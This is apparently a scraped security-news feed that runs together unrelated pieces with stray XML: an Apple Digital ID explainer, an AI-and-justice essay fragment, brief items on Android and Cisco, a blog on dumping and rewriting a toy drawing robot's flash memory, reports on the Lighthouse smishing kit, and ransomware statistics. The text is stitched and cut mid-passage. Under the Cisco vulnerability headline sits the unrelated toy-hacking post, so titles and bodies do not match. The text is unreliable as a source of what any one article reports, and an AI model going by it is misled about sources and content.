For now, it works only for identity verification at Transportation Security Administration (TSA) checkpoints in more than 250 airports.Apple says the reason for the introduction is because users asked for it:“Since introducing the ability to add a driver’s license or state ID to Apple Wallet in 2022, we’ve seen how much users love having their ID right on their devices. Digital IDs brings this secure and convenient option to even more users across the country, as they can now add an ID to Wallet using information from their U.S. passport.”What does Apple’s Digital ID mean for users?You add a Digital ID by scanning your physical passport (photo page and chip) and taking a selfie as part of a verification process. Your ID stays encrypted on the device and isn’t shared with Apple.To present it, you hold your iPhone or Apple Watch near a reader and confirm with Face ID or Touch ID. You choose which information is shared, and you never have to unlock or hand over your device.At launch, it’s TSA-only. Apple says wider use at businesses, organizations, and online services will come later. Digital ID  replace a passport for international travel.Pros of Apple’s Digital ID:Quickly present your ID from your iPhone or Apple Watch for TSA security, and eventually, for businesses or online checks.The ID data is locally encrypted and requires biometric authentication for access. Users review and authorize the information shared, and Apple claims it doesn’t track when you use the ID.It’s helpful for people without a REAL ID-compliant driver’s license who want to fly domestically.You don’t hand over your device for inspection. You just present your phone or watch to a reader.Apple already has the support of states and airports, and plans to expand.The risks of using Apple’s Digital IDWe had to look at other sources to find some of the more serious downsides.Lose your phone or watch, and you lose access to your Digital ID. That’s not to mention the risks if the device is stolen.Privacy and surveillance: Experts warn Digital ID adoption may lead to more ID checks in places that didn’t require them before, increasing surveillance and data tracking concerns.​Potential for security breaches: Encrypted or not, digital IDs can still be targeted by device exploits, phishing, or social engineering.Face ID or Touch ID can, in some cases, be spoofed or exploited.​Apple’s system is closed, which means users are dependent on Apple’s legacy, update policies, and device ecosystem. If you switch platforms, you might find it hard to recover your digital ID. Critics worry police or other authorities could pressure users to unlock devices under the guise of ID verification.Data sharing with state authorities: Your photo, video, and limited device analytics may be shared temporarily with issuing authorities for verification.​Digital ID doesn’t replace your passport outside the US, so it’s not very useful for international travel, and it’s not accepted everywhere yet.Apple’s Digital ID aims to make ID checks private, more secure, and convenient for most users. But concerns remain regarding privacy, device loss, ecosystem lock-in, and the potential for expanded surveillance and demands in everyday activities beyond TSA checkpoints.We still see this option as safer than storing your ID in a browser, where attacks are far more common, but the drawbacks may still outweigh the benefits for many users. As one of our readers put it: “The inconvenience of having to look through a drawer for my passport is not that big, that I would risk having my identity stolen.”We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

The line seems to be between fact-based decisions and judgment-based decisions.For example, in a medical context, if an AI was demonstrably better at reading a test result and diagnosing cancer than a human, you would take the AI in a second. You want the more accurate tool. But justice is harder because justice is inherently a human quality in a way that “Is this tumor cancerous?” is not. That’s a fact-based question. “What’s the right thing to do here?” is a human-based question.Chess provides a useful analogy for this evolution. For most of history, humans were best. Then, in the 1990s, Deep Blue beat the best human. For a while after that, a good human paired with a good computer could beat either one alone. But a few years ago, that changed again, and now the best computer simply wins. There will be an intermediate period for many applications where the human-AI combination is optimal, but eventually, for fact-based tasks, the best AI will likely surpass both.The enduring role for humans lies in making judgments, especially when values come into conflict. What is the proper immigration policy? There is no single “right” answer; it’s a matter of feelings, values, and what we as a society hold dear. A lot of societal governance is about resolving conflicts between people’s rights—my right to play my music versus your right to have quiet. There’s no factual answer there. We can imagine machines will help; perhaps once we humans figure out the rules, the machines can do the implementing and kick the hard cases back to us. But the fundamental value judgments will likely remain our domain.This essay originally appeared in IVY.]]></content:encoded></item><item><title>Google backpedals on new Android developer registration rules</title><link>https://www.bleepingcomputer.com/news/google/google-backpedals-on-new-android-developer-registration-rules/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 14 Nov 2025 11:54:44 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google is backpedaling on its decision to introduce new identity verification rules for all developers, stating that it will also introduce accounts for limited app distribution and will allow users to install apps from unverified devs. [...]]]></content:encoded></item><item><title>Multiple vulnerabilities in Cisco Unified CCX Allow Attackers to Execute Arbitrary Commands</title><link>https://cybersecuritynews.com/cisco-unified-ccx-vulnerability/</link><author></author><category>security</category><pubDate>Fri, 14 Nov 2025 11:38:48 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Multiple vulnerabilities in Cisco Unified CCX Allow Attackers to Execute Arbitrary Commands

## The Target

A few months ago I realized I was overdue for a fun, quirky hardware project. Every so often I like to see what new and interesting electronic children's toys are out there. When looking, I keep in mind the potential attack surface, typically preferring toys with companion mobile apps, wireless communications, or any other added complexity.

I came across these robots that draw from a set of pre-defined images. They all come with a pack of 100 or 150 cards, and the drawings appear very similar across brands. The attack surface seemed especially small, given that it uses pre-defined physical cards, so I wouldn't be able to snoop an FCC ID for this one and peek its sweet sweet innards (I consider those spoilers anyway). Regardless, it seemed like an interesting target and I couldn't resist.

I picked this one because it had the best face. The wording/typos on the box were definitely a good sign that there was some quirkiness afoot. It came with a stack of 100 cards, each with a very minimal "barcode" consisting of 8 bits of information, meaning 256 possible barcodes/drawings. The cards were separated into five categories: food, animal, plant, vehicle, and circle (obviously). I loaded up the “bulbous cactus” card and sent it on its way. It talked. It sang. It’s perfect.

Let us commence the evisceration.

## Tearing it Down

If I'm being honest, this is my favorite part.

On the bottom we have a few ultra-recessed screw-holes. You'd think at this point I'd be properly equipped to deal with these, but I'm not. Without fail, every hardware assesment helps me realize what I still don't have (besides patience). No matter how many specialized tools or components I amass in my home lab, there's always something that I end up having to buy. At this point I could have easily purchased what I needed for same or next-day delivery, but that would require patience. I could have probably 3D printed something to do the job. Again, I'm not that patient.

What I lack in patience I make up for in power tools. I ended up using a combination of, well, drilling the hole slightly bigger to clear some of my screwdriver bits, and chaining bits together.

With the four recessed screws removed, the top half popped off without much additional trouble.

With the barcode reader exposed, I tried some very basic preliminary fuzzing by taking a valid card and shifting it around to provide unexpected input. When a card is placed over the sensors, the device makes a sound and then announces the associated image.

While fuzzing, various images were announced, all of which seemed to match up with other cards I had seen in the deck, until the robot announced "Take a bath!" This seemed odd (and mildly offensive), so I rummaged through the deck and could not for the life of me find any cards with bath imagery.

With the card held in place, I pushed the button to initiate drawing. The robot started singing and, surely enough, drew this image:

## Goals

Now that I had a decent idea what I was working with, I set the following two goals for myself:

1. Enumerate and identify all available drawings. The cards clearly don’t tell the whole story here.

2. The classic goal at Atredis: Put a Bird on It™ (i.e. figure out how these drawings are represented and stored, and use this information to add our own).


## Components

My next step was to identify the components on the board and see what I could gather/dump. The three juicy ones are labelled below.

- LKS32MC07x - ARM Cortex-M0 MCU

- uc25IQ64 - 64MB SPI NOR flash

- uc25IQ128A - 128MB SPI NOR flash


I was able to dump the 64MB flash via its SPI interface, had no luck with the 128MB flash, and also had no luck connecting to the MCU via SWD. Not a great start, but i was undeterred.

## Barcode Analysis

Using a multimeter and the printed trace lines, we can map the connections for the optical sensors that read the barcode to determine which card is inserted.

I was initially stumped by the fact that there was some overlap between the sensors and the pins. In my research, I came upon the concept of input multiplexing. Essentially, the board will power sensors 1-5 using VCC 1, then read the values on the input pins. Then it powers sensors 6-8 using VCC 2, and reuses the same input pins to read those values.

To test this theory, I decided to hook a logic analyzer up to the various inputs. To keep myself sane, I replaced the original all-red-wired connector with two sets of color-coded custom ones broken out to a breadboard with two rows of headers between them. This setup would facilitate both passive analysis and active signal manipulation simultaneously.

Sure enough, the VCC lines alternated at a regular cadence, lending massive credibility to the multiplexing theory.

With everything connected to the Saleae, I could now observe the behavior when a card was scanned. I chose the card corresponding to barcode value 00000001 to hopefully make the data more obvious to recognize. With the crab card in place, I would expect the rightmost sensor to register the HIGH value, while the others would register LOW. Well, as you can see below, the orientation of the barcode is swapped on the backside, so in reality the leftmost sensor is registering the HIGH value. I wish I could say I noticed this right away. I really wish I could say that.

Once I figured that out, the data matched up with our expectations. During the VCC1 phase, sensors 1-5 are powered and the pins are read. Sensor 1 (leftmost) is our sole HIGH (1) in this case; sensors 2 through 5 are LOW (0). Then in VCC2 phase, sensors 6-8 are powered and the pins are once more read; the corresponding values make up the final 3 bits of our barcode, for a final value of 00000001. I have the VCC triggers shown in reverse order below (i.e. VCC2 before VCC1) to make the barcode value more clear, but this process repeats several times with consistent values, so the ordering is not relevant.

In hardware analysis, these are the moments I live for. The way I outline it here, It seems so straightforward and obvious (if I did my job correctly), but for me, the path here was sprinkled with failures, confusion, wiring mistakes, and several consultations with my coworker Chad(GPT).

Anyway let’s test this out with a more complex barcode. The hot dog card has a barcode value of 01000111.

## Barcode Emulation

Now that we understand how barcodes are translated into signals, we can emulate them using a programmable form of input. I opted to use a Raspberry Pi, as it can operate at 3.3V and seemed perfect for this use case.

First, we need to map each relevant pin on the sensor board to a GPIO pin on the pi. I'm using red to represent the VCC lines, but as you can see, they're actually mapped to GPIO pins here. Since we don't actually need to power a board, we're using these lines as input, so we can track the power cycles and know which sets of “sensors" are being read, and which barcode bits they correspond to.

With everything wired, the next step is to script up the logic to loop through the decimal values 1 through 256, convert to binary, chunk that binary up into two groups, and write the appropriate values to the GPIO pins based on which phase of the VCC multiplexing cycle we’re in.

```
import gpiod import time chip = gpiod.Chip("gpiochip0") #inputs: # VCC1 (GPIO23) # VCC2 (GPIO5) vcc1 = chip.get_line(23) vcc2 = chip.get_line(5) vcc1.request(consumer="vcc1", type=gpiod.LINE_REQ_DIR_IN) vcc2.request(consumer="vcc2", type=gpiod.LINE_REQ_DIR_IN) #outputs: # D1/6 (GPIO2) # D2/7 (GPIO3) # D3/8 (GPIO4) # D4 (GPIO17) # D5 (GPIO27) outputs = chip.get_lines([2, 3, 4, 17, 27]) outputs.request(consumer="barcode", type=gpiod.LINE_REQ_DIR_OUT) try: for bcode in range(1, 256): #convert to 8-bit binary string, then list of bits bits = [int(b) for b in format(bcode, '08b')] print(f"{bcode} ({bits})") #split into two groups from the right with order reversed (i.e. LSB first) #e.g. 204 ([1,1,0,0,1,1,0,0]) -> [0,0,1,1,0] & [0,1,1] group1 = bits[-5:][::-1] group2 = bits[:-5][::-1] last_vcc1 = 0 last_vcc2 = 0 start = time.time() while time.time() - start < 4: #let each barcode "sit" for 4 seconds v1 = vcc1.get_value() v2 = vcc2.get_value() #on VCC1 rising edge -> emit group1 if v1 == 1 and last_vcc1 == 0: out = group1 outputs.set_values(out) time.sleep(0.02) outputs.set_values([1, 1, 1, 1, 1]) #on VCC2 rising edge -> emit group2 on D1–D3, hold D4–5 HIGH if v2 == 1 and last_vcc2 == 0: out = group2 + [1, 1] outputs.set_values(out) time.sleep(0.02) outputs.set_values([1, 1, 1, 1, 1]) last_vcc1 = v1 last_vcc2 = v2 outputs.set_values([1, 1, 1, 1, 1]) time.sleep(2) except KeyboardInterrupt: outputs.set_values([1, 1, 1, 1, 1]) outputs.release() vcc1.release() vcc2.release()
```

It took a ton of trial and error, tweaking, logic analysis, wire rechecks, and cursing to get to this point.

While looping through every possible image, I painstakingly wrote down what I heard. In some cases, I really could not decipher the audio. In those cases, I would need to have the robot actually draw the image and hope it made sense.

With this “lookup” file, I modified the script to also print out the text along with the numeric value. Now I could pinpoint the oddballs and draw them, like the example below where I heard “chain block.”

```
$ python3 all-barcodes.py 218 ([1, 1, 0, 1, 1, 0, 1, 0]) 218: chain block?
```

Cool yes, seems plausible.

With this approach, I filled in some of the gaps and identified some of the “hidden” images that weren’t represented by the included cards.

The full set of available images can be seen below. The stack of cards provided with the robot include images 1 through 100. Everything beyond that is a mysterious hidden bonus.

With my first goal achieved, it was time to move on to potentially getting this thing to draw arbitrary images.

## Drawing Analysis

To be able to draw our own images, we need to understand how images are represented, where they’re stored, and whether we have the ability to overwrite these values. When I first opened this thing up, I was only able to dump the smaller of the two flash chips, so I had to hope this is where the images files lived or figure out how to dump the larger chip as well.

Going back to my initial flash dump, the hex output looked to contain a directory entry layout with some numeric filenames, which seemed promising.

```
$ xxd UC25IQ64.bin | head -n 20 00000000: 1972 81a6 2000 0000 80b0 5600 03ff 0000 .r.. .....V..... 00000010: 7465 7374 5f64 6972 00ff ffff ffff ffff test_dir........ 00000020: 42ae 43d2 2045 0000 ac0f 0000 02ff 0000 B.C.

```

A typical directory entry layout looks a bit like the following:

```
Directory entry layout (32 bytes total) 0x00 0x04 0x08 0x0C 0x10 0x20 ┌───────────────┬──────────────┬─────────────┬─────────────┬──────────────────────────┐ │ CRC / checksum│ START offset │ SIZE │ FLAGS │ NAME (ASCII, 16 bytes) │ │ (uint32 LE) │ (uint32 LE) │ (uint32 LE) │ (uint32 LE) │ null-terminated │ └───────────────┴──────────────┴─────────────┴─────────────┴──────────────────────────┘
```

For example, the directory entry for `001.fla` has the following content breakdown:

```
[FILE] Entry @ 0x000020 (32 bytes) name='001.f1a' +--------+-------------------------------------------------+ +------------------+ | Offset | HEX | | ASCII | +--------+-------------------------------------------------+ +------------------+ | 0x00 | 42 AE 43 D2 20 45 00 00 AC 0F 00 00 02 FF 00 00 | | B.C. E.......... | | 0x10 | 30 30 31 2E 66 31 61 00 FF FF FF FF FF FF FF FF | | 001.f1a......... | +--------+-------------------------------------------------+ +------------------+ Field map: [0x00..0x03] CRC / checksum (LE) = 0xD243AE42 [0x04..0x07] START offset (LE) = 0x004520 [0x08..0x0B] SIZE bytes (LE) = 0xFAC [0x0C..0x0F] FLAGS / unk (LE) = 0x0000FF02 [0x10..0x1F] NAME (ASCII, null-term) = '001.f1a' Content slice: data[0x004520 : 0x0054CC] (len=0xFAC)
```

Knowing this, we can semi-shamefully vibe code a High Level Analyzer (HLA) in Logic to identify all SPI `flash_read` operations, take the associated read address from the `fast_read`, perform a lookup against our directory entry layout, and print the associated filename to show what is being read at that moment.

With the HLA in place, I had the bot read and draw image number 105. Sure enough, it read the file `Y105.f1a`. However, it read several other files during the course of drawing, including `TE05luo2.f1a`, `TXXm5.f1b`, and `TE08stop.f1a`. When I scanned other cards, the associated `YXXX.f1a` file was read, even if I never drew the image. The pattern of these other reads seemed to line up with whenever the robot would talk or sing. This led me to believe that I was actually looking at the audio files, not the drawings.

It was time to go after that second SPI flash chip again. Fortunately I learned from my trusted colleague Chris Bellows that, when in doubt, go for the chip-off extraction. This was successful and a good time was had by all.

```
$ sudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r UC25IQ128_3.bin flashrom unknown on Linux 6.8.0-60-generic (aarch64) flashrom is free software, get the source code at https://flashrom.org Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). === SFDP has autodetected a flash chip which is not natively supported by flashrom yet. [...] Found Unknown flash chip "SFDP-capable chip" (2048 kB, SPI) on buspirate_spi. === This flash part has status UNTESTED for operations: WP [...] Reading flash... done.
```

Side note - with this SPI flash chip removed from the board, the drawbot still functioned. It would power on, read and announce cards, and play music. The one thing it did NOT do was actually move its arms and draw the images, which seemed like pretty intense proof that this chip contained the drawing files and the smaller flash chip contained the audio.

The contents of the extracted image looked very structured, which boded well for being some sort of coordinate-based data that one would expect for a drawing.

```

Because it's the year 2025 and LLMs are coming for our jobs anyway, I thought I would give ChatGPT a chance to make short work of my analysis. I fed it the dump, said I suspected that it contained image instruction files, and sent it on its way.

Putting aside the excessive flattery and overall semi-off-putting vibe of my ChatGPT, we’ve got it!

Only problem is, there appear to be only 35 images within the file. The first 35 images to be exact. Since this is an atypical chip, it's possible that flashrom is making incorrect assumptions. We know from the spec that we should have 16MB of data, so we can force it to read 16MB by specifying a target chip similar enough to ours. I've done several extractions of Winbond flash, so that’s what I went with, and the new dump contained 254 images.

Since we now know the structure, we can script up a parser/generator in Python that will carve out the data for each image, process the coordinates, and feed them into SVG path elements to create an image file. An excerpt of this script can be seen here:

```
def write_svg(strokes, out: Path, flip_y=True, stroke_w=2): bb = bbox(strokes) if not bb: return False xmin, ymin, xmax, ymax = bb w, h = xmax - xmin + 1, ymax - ymin + 1 with out.open("w", encoding="utf-8") as f: if flip_y: f.write(f'\n') f.write(f' \n\n') else: f.write(f'\n') for s in strokes: f.write(' \n'.format( s[0][0], s[0][1], " ".join(f"L{x},{y}" for x, y in s[1:]))) f.write('\n') return True def main(): ap = argparse.ArgumentParser(description="Extract SVGs from fixed slots") ap.add_argument("bin", type=Path, help="full flash dump (e.g., full.bin)") ap.add_argument("--out", type=Path, default=Path("svgs"), help="output directory") ap.add_argument("--base", type=lambda x:int(x,0), default=0x04, help="first slot start offset (default 0x04)") ap.add_argument("--slot", type=lambda x:int(x,0), default=0xEA60, help="slot size (default 0xEA60)") ap.add_argument("--count", type=int, default=None, help="number of slots (default: autodetect from file size)") ap.add_argument("--min-pts", type=int, default=2, help="min points to export (default 2)") ap.add_argument("--no-flip-y", action="store_true", help="do not flip Y axis") args = ap.parse_args() data = args.bin.read_bytes() size = len(data) if args.count is None: # Best-effort autodetect usable = max(0, size - args.base) args.count = usable // args.slot args.out.mkdir(parents=True, exist_ok=True) exported = 0 for i in range(args.count): off = args.base + i * args.slot if off >= size: break slot = data[off : min(off + args.slot, size)] words = u16be_words(slot) strokes = strokes_from_slot(words) if sum(len(s) for s in strokes) < args.min_pts: continue svg_path = args.out / f"drawing_{i:03d}.svg" if write_svg(strokes, svg_path, flip_y=not args.no_flip_y, stroke_w=2): exported += 1 # uncomment for debug: # print(f"{i:03d} @ 0x{off:08X} -> {svg_path.name}") print(f"Exported {exported} SVGs to {args.out} from {args.count} slots " f"(base=0x{args.base:X}, slot=0x{args.slot:X}).")
```

Because this was written by an LLM, it is a bit.. _extra_. It could likely be simplified, but in its current state, it lets you specify the slot offset where you’d like to start extracting images, the number of sequential images to extract, the minimum number of points it must detect before it considers an entry a valid image, and the ability to flip the image when rendering (since it draws from the top, it actually stores the images upside-down).

```
> python3 img_carver.py ../dumps/UC25IQ128_forced.bin --no-flip-y --out svgs Exported 254 SVGs to svgs from 279 slots (base=0x4, slot=0xEA60).
```

Well this would have been a more straightforward way to view all possible images without enumerating and spoofing them, but hey, there are many ways to skin a cat and I’d like to learn them all. There are a lot of cats in this world that need skinning.

Now that we can go from raw data -> SVG, we want to go in the other direction to get this thing to draw an image of our choosing. There are a lot of tools out there to convert a PNG to an SVG, and below you can see why the latter is much more suited to our needs. SVGs are scalable because they contain path data that can be easily transformed with the power of maths.

With our target image, we just need to parse through the path data and transform it into the data format that drawbot expects. Since the flash memory is just one big blob and we’re hoping to only overwrite one image (i.e. the other drawings will still work), we need to make sure our padding is correct and that we follow the expected format, including any necessary delimiters. As we could see from the crab drawing ChatGPT spit out, it didn’t quite seem to process the “pen up” actions properly, so every movement drew a line. Luckily for me, my drawing is a single continuous line, so I don’t have to worry about that quite yet.

Here’s an excerpt of my final script. It takes an existing slot, determines the bounding box, fits the new SVG into the coordinate plane’s bounding box, then creates a new slot that’s the same size as the one to be replaced.

```
def main(): ap = argparse.ArgumentParser(description="Fit an SVG to a slot's bbox and pack to device format") ap.add_argument("slot_content", type=Path, help="existing slot content (0xEA5C bytes; starts at first X)") ap.add_argument("svg", type=Path, help="SVG to insert") ap.add_argument("--out", type=Path, default=Path("slot_new_content.bin"), help="output content-only bin (0xEA5C)") ap.add_argument("--out-with-marker", type=Path, help="also write a 0xEA60 file with trailing FFFF FFFF") ap.add_argument("--step", type=float, default=4.0, help="sampling step in SVG units (bigger = fewer points)") ap.add_argument("--margin", type=float, default=0.0, help="margin in device units inside target bbox (default 0)") ap.add_argument("--flip-y", action="store_true", help="flip Y if your preview is upside-down") args = ap.parse_args() slot_bytes = args.slot_content.read_bytes() if len(slot_bytes) != CONTENT_LEN and len(slot_bytes) != SLOT_LEN: print(f"[warn] slot_content length is {len(slot_bytes)}; expected 0xEA5C or 0xEA60.

```

Now that we’ve overwritten a single slot, we need to write it back into the original image.

```
$ dd if=slot_006_new_content_03.bin of=UC25IQ128_trunc_mod.bin bs=1 seek=$((0x000493E4)) conv=notrunc 59996+0 records in 59996+0 records out 59996 bytes transferred in 0.120694 secs (497092 bytes/sec)
```

I _should_ have confirmed that we could write to the flash chip before even going down this path. Fortunately, we could.

```
$ sudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=250k -f -w UC25IQ128_trunc_mod.bin -VV flashrom unknown on Linux 6.8.0-60-generic (aarch64) flashrom is free software, get the source code at https://flashrom.org Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). flashrom was built with GCC 13.2.0, little endian […] Found Unknown flash chip "SFDP-capable chip" (2048 kB, SPI). === This flash part has status UNTESTED for operations: WP … Block protection is disabled.

Raw bitbang mode version 1 Bus Pirate shutdown completed.
```

It was at this point that I remembered that the chip wasn’t actually installed into the drawbot anymore. Since nothing ever works on the first try, this was very likely a problem. I already had it installed on this nice breakout board with headers, so I soldered wires to the board itself, globbed on hot glue to try and keep them from ripping off of the board, and hooked them up to connectors on the other side. This way, I could switch back and forth between my programmer and the drawbot until it was just right.

It took a few iterations where I had to work out some minor kinks, but it actually worked. I couldn’t have some gnarled headless robot in my final demo, so I modified the the case to accommodate its flash chip hanging out and patched it back up as best I could.

If you’d like to watch the whole video, you’ll get to hear one of the many drawbot songs that have been stuck in my head during the course of this project.

A potential area of future work would be streamlining this process to facilitate passing an image to a script that would handle conversion, writing to flash, and triggering the drawing (more GPIO manipulation with the pi) all at once. It would also be fun to figure out the audio format to replace the various songs and sounds (I did spend a little time attempting to decode and play them using ffmpeg). I also considered overhauling the drawbot entirely, designing and 3d-printing a new body.

It’s entirely possible that I’ll come back and try one or all of these things in the future. If I do and anything comes of it, I’ll be sure to let you know.

What’s more likely is that I’ll find a new target to respectfully butcher and reanimate. Will keep you posted either way.

Google said Lighthouse has harmed more than a million victims across 120 countries.A component of the Chinese phishing kit Lighthouse made to target customers of The Toll Roads, which refers to several state routes through Orange County, Calif.Regardless of the text message lure used or brand used, the basic scam remains the same: After the visitor enters their payment information, the phishing site will automatically attempt to enroll the card as a mobile wallet from Apple or Google. The phishing site then tells the visitor that their bank is going to verify the transaction by sending a one-time code that needs to be entered into the payment page before the transaction can be completed.If the recipient provides that one-time code, the scammers can link the victim’s card data to a mobile wallet on a device that they control. Researchers say the fraudsters usually load several stolen wallets onto each mobile device, and wait 7-10 days after that enrollment before selling the phones or using them for fraud.Google called the scale of the Lighthouse phishing attacks “staggering.” A May 2025 report from  found the domains used by the Smishing Triad are rotated frequently, with approximately 25,000 phishing domains active during any 8-day period.Google’s lawsuit alleges the purveyors of Lighthouse violated the company’s trademarks by including Google’s logos on countless phishing websites. The complaint says Lighthouse offers over 600 templates for phishing websites of more than 400 entities, and that Google’s logos were featured on at least a quarter of those templates.Google is also pursuing Lighthouse under the Racketeer Influenced and Corrupt Organizations (RICO) Act, saying the Lighthouse phishing enterprise encompasses several connected threat actor groups that work together to design and implement complex criminal schemes targeting the general public.According to Google, those threat actor teams include a “” that supplies the phishing software and templates; a “” that provides a list of targets; a “” that provides the tools to send fraudulent text messages in volume; a “,” in charge of monetizing the phished information; and an “,” which runs their Telegram support channels and discussion groups designed to facilitate collaboration and recruit new members.“While different members of the Enterprise may play different roles in the Schemes, they all collaborate to execute phishing attacks that rely on the Lighthouse software,” Google’s complaint alleges. “None of the Enterprise’s Schemes can generate revenue without collaboration and cooperation among the members of the Enterprise. All of the threat actor groups are connected to one another through historical and current business ties, including through their use of Lighthouse and the online community supporting its use, which exists on both YouTube and Telegram channels.”Silent Push’s May report observed that the Smishing Triad boasts it has “300+ front desk staff worldwide” involved in Lighthouse, staff that is mainly used to support various aspects of the group’s fraud and cash-out schemes.An image shared by an SMS phishing group shows a panel of mobile phones responsible for mass-sending phishing messages. These panels require a live operator because the one-time codes being shared by phishing victims must be used quickly as they generally expire within a few minutes.Google alleges that in addition to blasting out text messages spoofing known brands, Lighthouse makes it easy for customers to mass-create fake e-commerce websites that are advertised using Google Ads accounts (and paid for with stolen credit cards). These phony merchants collect payment card information at checkout, and then prompt the customer to expect and share a one-time code sent from their financial institution.Once again, that one-time code is being sent by the bank because the fake e-commerce site has just attempted to enroll the victim’s payment card data in a mobile wallet. By the time a victim understands they will likely never receive the item they just purchased from the fake e-commerce shop, the scammers have already run through hundreds of dollars in fraudulent charges, often at high-end electronics stores or jewelers. works in security research at SecAlliance, a CSIS Security Group company, and he’s been tracking Chinese SMS phishing groups for several years. Merrill said many Lighthouse customers are now using the phishing kit to erect fake e-commerce websites that are advertised on Google and Meta platforms.“You find this shop by searching for a particular product online or whatever, and you think you’re getting a good deal,” Merrill said. “But of course you never receive the product, and they will phish that one-time code at checkout.”Merrill said some of the phishing templates include payment buttons for services like , and that victims who choose to pay through PayPal can also see their PayPal accounts hijacked.A fake e-commerce site from the Smishing Triad spoofing PayPal on a mobile device.“The main advantage of the fake e-commerce site is that it doesn’t require them to send out message lures,” Merrill said, noting that the fake vendor sites have more staying power than traditional phishing sites because it takes far longer for them to be flagged for fraud.Merrill said Google’s legal action may temporarily disrupt the Lighthouse operators, and could make it easier for U.S. federal authorities to bring criminal charges against the group. But he said the Chinese mobile phishing market is so lucrative right now that it’s difficult to imagine a popular phishing service voluntarily turning out the lights.Merrill said Google’s lawsuit also can help lay the groundwork for future disruptive actions against Lighthouse and other phishing-as-a-service entities that are operating almost entirely on Chinese networks. According to Silent Push, a majority of the phishing sites created with these kits are sitting at two Chinese hosting companies:  (AS132203) and  (AS45102).“Once Google has a default judgment against the Lighthouse guys in court, theoretically they could use that to go to Alibaba and Tencent and say, ‘These guys have been found guilty, here are their domains and IP addresses, we want you to shut these down or we’ll include you in the case.'”If Google can bring that kind of legal pressure consistently over time, Merrill said, they might succeed in increasing costs for the phishers and more frequently disrupting their operations.“If you take all of these Chinese phishing kit developers, I have to believe it’s tens of thousands of Chinese-speaking people involved,” he said. “The Lighthouse guys will probably burn down their Telegram channels and disappear for a while. They might call it something else or redevelop their service entirely. But I don’t believe for a minute they’re going to close up shop and leave forever.”]]></content:encoded></item><item><title>1 million victims, 17,500 fake sites: Google takes on toll-fee scammers</title><link>https://www.malwarebytes.com/blog/news/2025/11/1-million-victims-17500-fake-sites-google-takes-on-toll-fee-scammers</link><author></author><category>threatintel</category><pubDate>Thu, 13 Nov 2025 14:43:06 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[A Phishing-as-a-Service (PhaaS) platform based in China, known as “Lighthouse,” is the subject of a new Google lawsuit.Lighthouse enables smishing (SMS phishing) campaigns, and if you’re in the US there is a good chance you’ve seen their texts about a small amount you supposedly owe in toll fees. Here’s an example of a toll-fee scam text:Google’s lawsuit brings claims against the Lighthouse platform under federal racketeering and fraud statutes, including the Racketeer Influenced and Corrupt Organizations Act (RICO), the Lanham Act, and the Computer Fraud and Abuse Act.The texts lure targets to websites that impersonate toll authorities or other trusted organizations. The goal is to steal personal information and credit card numbers for use in further financial fraud.As we reported in October 2025, Project Red Hook launched to combine the power of the US Homeland Security Investigations (HSI), law enforcement partners, and businesses to raise awareness of how Chinese organized crime groups use gift cards to launder money.These toll, postage, and refund scams might look different on the surface, but they all feed the same machine, each one crafted to look like an urgent government or service message demanding a small fee. Together, they form an industrialized text-scam ecosystem that’s earned Chinese crime groups more than $1 billion in just three years.Google says Lighthouse alone affected more than 1 million victims across 120 countries. A September report by Netcraft discussed two phishing campaigns believed to be associated with Lighthouse and “Lucid,” a very similar PhaaS platform. Since identifying these campaigns, Netcraft has detected more than 17,500 phishing domains targeting 316 brands from 74 countries.As grounds for the lawsuit, Google says it found at least 107 phishing website templates that feature its own branding to boost credibility. But a lawsuit can only go so far, and Google says robust public policy is needed to address the broader threat of scams:“We are collaborating with policymakers and are today announcing our endorsement of key bipartisan bills in the U.S. Congress.”Will lawsuits, disruptions, and even bills make toll-fee scams go away? Not very likely. The only thing that will really help is if their source of income dries up because people stop falling for smishing. Education is the biggest lever. Red flags in smishing messagesThere are some tell-tale signs in these scams to look for:Spelling and grammar mistakes: the scammers seem to have problems with formatting dates. For example “September 10nd”, “9st” (instead of 9th or 1st).you only have one or two days to pay. Or else…The over-the-top threats: Real agencies won’t say your “credit score will be affected” for an unpaid traffic violation. “Ohio Administrative Code 15C-16.003” doesn’t match any real Ohio BMV administrative codes. When a code looks fake, it probably is! Truly trusted organizations don’t send urgent “pay now or else” links by text.Vague or missing personalization: Genuine government agencies tend to use your legal name, not a generic scare message sent to many people at the same time.Recognizing scams is the most important part of protecting yourself, so always consider these golden rules:Always search phone numbers and email addresses to look for associations with known scams.When in doubt, go directly to the website of the organization that contacted you to see if there are any messages for you.Do not get rushed into decisions without thinking them through.Do not click on links in unsolicited text messages.Do not reply, even if the text message explicitly tells you to do so.If you have engaged with the scammers’ website:Immediately change your passwords for any accounts that may have been compromised. Contact your bank or financial institution to report the incident and take any necessary steps to protect your accounts, such as freezing them or monitoring for suspicious activity. Consider a fraud alert or credit freeze. To start layering protection, you might want to place a fraud alert or credit freeze on your credit file with all three of the primary credit bureaus.

During the third quarter of 2025, we monitored more than **85 active data leak sites** (DLS) that collectively listed **1,592 new victims**. Compared to the **1,607 victims reported in Q2** 2025, the publication rate remained stable though it is still **notably higher** than the 1,270 victims recorded in Q3 2024 (a 25% increase YoY). Overall, there are **approximately 520 to 540 new victims per month**, indicating that ransomware activity has plateaued albeit at historically high levels.

_Figure 1 – Total Number of Reported Ransomware Victims in DLS, per month._

Despite the termination of several prominent ransomware groups, the **overall number of active threat actors continues to grow**, with new ones appearing every month.

During Q3 2025, we observed a steady expansion of double-extortion activity, driven mostly by small and emerging operators. Of the 85 data leak sites tracked this quarter, **47 groups published fewer than ten victims**, suggesting a growing number of affiliates moving beyond established ransomware-as-a-service (RaaS) programs to conduct attacks independently.

This fragmentation follows the **closure or dormancy** of several major RaaS brands during the year, including RansomHub, 8Base, BianLian, Cactus, and others. In Q3 alone, 14 new groups began publishing victims, bringing the total number of **newly observed actors in 2025 to 45**. In Q1, the ten most active groups accounted for 71% of all DLS postings. In Q2, their share fell to 63%, and by Q3, to just 56%.

